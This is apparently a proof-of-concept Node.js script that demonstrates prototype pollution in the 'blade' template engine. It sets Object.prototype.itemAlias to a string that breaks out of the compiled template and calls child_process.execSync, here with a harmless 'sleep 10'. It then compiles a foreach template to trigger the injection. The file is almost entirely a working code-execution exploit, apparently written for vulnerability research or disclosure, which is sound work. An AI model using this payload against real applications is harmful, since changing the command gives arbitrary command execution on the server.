const blade = require('blade');
const fs = require('fs');
const path = require('path');

Object.prototype.value = "somevalue"
Object.prototype.itemAlias = "){global.process.mainModule.require('child_process').execSync('sleep 10')}\n,function("


// This template includes the `foreach` directive
const mainFilePath = path.join(__dirname, '/views/foreach.blade');

fs.readFile(mainFilePath, 'utf8', (err, mainFile) => {
    if (err) throw err;

    blade.compile(mainFile, { filename: mainFilePath, debug: true }, (err, tmpl) => {
        if (err) throw err;

        tmpl({}, function(err, html) {
            if (err) throw err;
            console.log(html);
        });
    });
});